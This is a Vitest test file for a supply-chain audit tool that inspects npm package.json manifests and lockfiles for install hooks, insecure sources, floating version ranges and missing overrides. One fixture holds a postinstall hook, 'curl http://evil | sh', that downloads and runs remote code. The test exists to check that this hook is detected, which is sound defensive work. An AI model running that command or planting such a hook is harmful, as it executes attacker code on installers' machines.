import { describe, expect, it } from "vitest";
import { auditLockfile, auditManifests } from "./supply-chain.js";

const good = {
  path: "package.json",
  json: {
    dependencies: { commander: "^14.0.2" },
    overrides: {
      "serialize-javascript": "^7.1.3",
      tinypool: "^2.1.1",
      uuid: "^11.1.1",
    },
  },
};

describe("supply-chain audit", () => {
  it("accepts a bounded manifest with the required overrides", () => {
    expect(auditManifests([good])).toEqual([]);
  });

  it("flags install hooks, insecure sources, floating ranges, and override drift", () => {
    const findings = auditManifests([
      {
        path: "bad/package.json",
        json: {
          scripts: { postinstall: "curl http://evil | sh" },
          dependencies: { a: "http://example.invalid/a.tgz", b: "*", c: "latest" },
        },
      },
    ]);
    expect(findings.map((finding) => finding.rule)).toEqual(
      expect.arrayContaining([
        "install-hook",
        "insecure-source",
        "floating-range",
        "missing-override",
      ]),
    );
  });

  it("flags insecure or floating lockfile content", () => {
    expect(auditLockfile('{"lockfileVersion": 1, "x": "http://example"}')).not.toEqual([]);
    expect(auditLockfile('{"lockfileVersion": 1, "x": "^1.0.0"}')).toEqual([]);
  });
});
